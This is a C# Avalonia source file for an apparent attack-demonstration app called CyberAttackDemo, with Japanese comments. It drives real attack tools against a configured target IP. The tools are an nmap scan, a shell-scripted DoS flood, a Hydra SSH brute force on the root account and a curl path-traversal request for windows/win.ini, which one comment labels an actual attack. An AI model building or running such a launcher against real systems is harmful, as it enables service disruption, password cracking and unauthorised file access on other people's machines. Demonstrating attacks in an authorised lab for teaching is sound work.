using Avalonia;
using Avalonia.Controls;
using Avalonia.Input;
using Avalonia.Interactivity;
using Avalonia.Threading;
using CyberAttackDemo;
using System;
using System.Threading.Tasks;

namespace CyberAttackDemo
{
    public partial class MainWindow : Window
    {
        private readonly ConfigManager _config;
        private readonly AttackEngine _engine;

        public MainWindow()
        {
            InitializeComponent();
            
            _config = new ConfigManager();
            _engine = new AttackEngine();

            _engine.OnLogReceived += msg => Dispatcher.UIThread.Post(() => WriteLog(msg));

            this.KeyDown += OnKeyDown;
            this.Opened += OnWindowOpened;
        }

        private async void OnWindowOpened(object? sender, EventArgs e)
        {
            _config.Load();
            await _engine.EnsureAttackScriptExistsAsync();

            WriteLog("SYSTEM INITIALIZED.");
            WriteLog($"TARGET LOCKED: {_config.TargetIp}");
            WriteLog($"ATTACK TIMEOUT SET TO: {_config.DdosDuration} SECONDS");
            WriteLog("WAITING FOR USER AUTHORIZATION...");
            
            if (TargetIpDisplay != null) TargetIpDisplay.Text = _config.TargetIp;
        }

        private void OnKeyDown(object? sender, KeyEventArgs e)
        {
            if (e.KeyModifiers == KeyModifiers.Control && e.Key == Key.Q) Close();
            if (e.Key == Key.F11) ToggleFullScreen();
        }

        private void ToggleFullScreen()
        {
            if (WindowState == WindowState.FullScreen)
            {
                WindowState = WindowState.Normal;
                SystemDecorations = SystemDecorations.Full;
                Topmost = false;
            }
            else
            {
                WindowState = WindowState.FullScreen;
                SystemDecorations = SystemDecorations.None;
                Topmost = true;
            }
        }

        // --- フェーズ1: ポートスキャン ---
        private async void OnScanClick(object sender, RoutedEventArgs e)
        {
            SetBusyState(true, "SCANNING NETWORK...", Avalonia.Media.Brushes.Yellow);
            WriteLog("\n==========================================");
            WriteLog($"[*] INITIATING PORT SCAN ON {_config.TargetIp}...");
            WriteLog("==========================================");

            await _engine.RunCommandAsync("nmap", $"-F -sV {_config.TargetIp}");

            WriteLog("\n[SCAN COMPLETE] ANALYZING VULNERABILITIES...");
            
            if (Phase1Panel != null) Phase1Panel.IsVisible = false;
            if (Phase2Panel != null) Phase2Panel.IsVisible = true;
            
            if (AttackSelector != null) AttackSelector.IsEnabled = true;
            if (ExecuteButton != null) ExecuteButton.IsEnabled = true;
            
            UpdateStatus("VULNERABILITY DETECTED. SELECT ACTION.", Avalonia.Media.Brushes.Red);
        }

        // --- フェーズ2: 攻撃実行 ---
        private async void OnExecuteClick(object sender, RoutedEventArgs e)
        {
            if (AttackSelector == null) return;

            int selectedIndex = AttackSelector.SelectedIndex;

            if (selectedIndex == 0) await RunDosAttack();
            else if (selectedIndex == 1) await RunBruteForce();
            else if (selectedIndex == 2) await RunDirectoryTraversal();
        }

        // --- DoS攻撃 ---
        private async Task RunDosAttack()
        {
            SetBusyState(true, "EXECUTING DoS ATTACK...", Avalonia.Media.Brushes.Red);
            WriteLog("\n==========================================");
            WriteLog($"[*] INITIATING SHELL-SCRIPTED FLOOD ATTACK...");
            WriteLog($"[*] DURATION LIMIT: {_config.DdosDuration} SECONDS");
            WriteLog("[!] WARNING: EXTREME NETWORK LOAD.");
            WriteLog("==========================================");

            await _engine.EnsureAttackScriptExistsAsync();

            // mode = dos
            string args = $"{AttackEngine.AttackScriptName} {_config.TargetIp} {_config.DdosDuration} dos";
            await _engine.RunCommandAsync("bash", args, _config.DdosDuration);

            WriteLog("\n[ATTACK STOPPED] SHELL SCRIPT TERMINATED.");
            SetBusyState(false, "READY FOR NEXT COMMAND.");
        }

        // --- SSH攻撃 (Hydra) ---
        private async Task RunBruteForce()
        {
            SetBusyState(true, "CRACKING PASSWORDS...", Avalonia.Media.Brushes.Red);
            WriteLog("\n==========================================");
            WriteLog("[*] INITIATING SSH BRUTE FORCE ATTACK (Hydra)...");
            WriteLog("[*] USER: root");
            WriteLog("[*] WORDLIST: Built-in (Top 5 common passwords)");
            WriteLog("==========================================");

            await _engine.EnsureAttackScriptExistsAsync();

            // mode = hydra
            string args = $"{AttackEngine.AttackScriptName} {_config.TargetIp} {_config.DdosDuration} hydra";
            // Hydraは完了まで待つが、万が一のために設定時間+αで強制終了
            await _engine.RunCommandAsync("bash", args, _config.DdosDuration + 30);

            WriteLog("\n[ATTACK FINISHED] HYDRA SESSION COMPLETE.");
            SetBusyState(false, "READY FOR NEXT COMMAND.");
        }

        // --- ディレクトリトラバーサル (実攻撃) ---
        private async Task RunDirectoryTraversal()
        {
            SetBusyState(true, "EXECUTING PATH TRAVERSAL...", Avalonia.Media.Brushes.Red);
            WriteLog("\n==========================================");
            WriteLog($"[*] INITIATING DIRECTORY TRAVERSAL ATTACK (ACTUAL)...");
            WriteLog("[*] TARGET: Windows IIS (Assumed)");
            WriteLog("[*] PAYLOAD: ../../../../windows/win.ini");
            WriteLog("==========================================");

            string targetUrl = $"http://{_config.TargetIp}/../../../../windows/win.ini";
            string args = $"--path-as-is -v --max-time 5 \"{targetUrl}\"";
            
            WriteLog($"[*] Executing: curl {args}");
            
            await _engine.RunCommandAsync("curl", args, 10);

            WriteLog("\n[ATTACK FINISHED] Response received (or blocked by IDS).");
            SetBusyState(false, "READY FOR NEXT COMMAND.");
        }

        // --- リセット ---
        private void OnResetClick(object sender, RoutedEventArgs e)
        {
            if (LogOutput != null) LogOutput.Text = "";
            if (Phase2Panel != null) Phase2Panel.IsVisible = false;
            if (Phase1Panel != null) Phase1Panel.IsVisible = true;
            if (ScanButton != null) ScanButton.IsEnabled = true;
            
            _config.Load();
            if (TargetIpDisplay != null) TargetIpDisplay.Text = _config.TargetIp;
            
            UpdateStatus("WAITING FOR COMMAND", Avalonia.Media.Brushes.Yellow);
            WriteLog("SYSTEM RESET. READY.");
        }

        // --- UI Helper Methods ---
        private void SetBusyState(bool isBusy, string statusText, Avalonia.Media.IBrush? color = null)
        {
            if (isBusy)
            {
                if (ScanButton != null) ScanButton.IsEnabled = false;
                if (ExecuteButton != null) ExecuteButton.IsEnabled = false;
                if (AttackSelector != null) AttackSelector.IsEnabled = false;
            }
            else
            {
                if (ScanButton != null) ScanButton.IsEnabled = true;
                if (ExecuteButton != null) ExecuteButton.IsEnabled = true;
                if (AttackSelector != null) AttackSelector.IsEnabled = true;
            }
            UpdateStatus(statusText, color);
        }

        private void UpdateStatus(string text, Avalonia.Media.IBrush? color = null)
        {
            if (StatusText != null)
            {
                StatusText.Text = $"STATUS: {text}";
                if (color != null) StatusText.Foreground = color;
            }
        }

        private void WriteLog(string message)
        {
            if (LogOutput == null || LogScrollViewer == null) return;
            LogOutput.Text += $"{message}\n";
            LogScrollViewer.ScrollToEnd();
        }
    }
}
